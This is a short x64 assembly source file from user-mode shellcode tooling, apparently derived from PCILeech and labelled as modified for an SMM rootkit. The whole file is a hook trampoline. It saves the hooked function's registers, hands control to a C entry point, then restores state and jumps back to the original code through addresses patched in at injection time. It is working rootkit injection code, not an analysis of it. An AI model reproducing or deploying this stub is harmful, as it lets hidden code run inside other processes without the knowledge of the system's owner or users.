; wx64_umd_exec.asm : assembly to receive execution from initial hook in user-mode shellcode (umd).
;
; (c) Ulf Frisk, 2019
; Author: Ulf Frisk, pcileech@frizk.net
; Modified for SMM rootkit by Jussi Hietanen

EXTRN c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS - MAX 3 PARAMS IN FNCALL
	;    OF HOOKED FUNCTION IS CURRENTLY SUPPORTED ...
	; ----------------------------------------------------
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	JMP main_continue
	; ----------------------------------------------------
	; 0: ADDRESS OF ORIGINAL CODE AND MAIN CONTEXT (IN RW SECTION)
	; ----------------------------------------------------
	addr_main_context					dq 1111111111111111h	; offset 0x08
	addr_orig_code						dq 2222222222222222h	; offset 0x10
	; ----------------------------------------------------
	; 2: CALL MAIN SETUP CODE
	; ----------------------------------------------------
	main_continue:
	PUSH rax
	MOV rcx, [addr_main_context]
	SUB rsp, 30h
	CALL c_EntryPoint
	ADD rsp, 30h
	; ----------------------------------------------------
	; 3: RESTORE AND JMP BACK
	; ----------------------------------------------------
	POP rax
	POP r9
	POP r8
	POP rdx
	POP rcx
	JMP [addr_orig_code]
main ENDP

END
